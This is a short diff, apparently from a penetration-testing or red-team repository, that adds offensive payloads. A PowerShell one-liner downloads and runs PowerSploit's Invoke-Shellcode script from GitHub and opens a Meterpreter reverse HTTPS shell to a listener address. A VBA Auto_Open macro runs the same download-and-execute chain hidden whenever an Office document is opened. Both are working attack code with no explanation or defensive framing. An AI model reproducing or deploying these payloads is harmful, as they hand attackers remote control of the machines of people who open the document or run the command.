@@ -1,0 +1,7 @@
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/2153a0a0b05ce5cdacceefeefe46b30f20caf3db/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.254.121.28 -Lport 4444 -Force"
+
+
+Macro:
+Sub Auto_Open()
+Call Shell("cmd.exe /c powershell.exe -noexit ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/2153a0a0b05ce5cdacceefeefe46b30f20caf3db/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.0.2.15 -Lport 443 -Force""", vbHide)
+End Sub
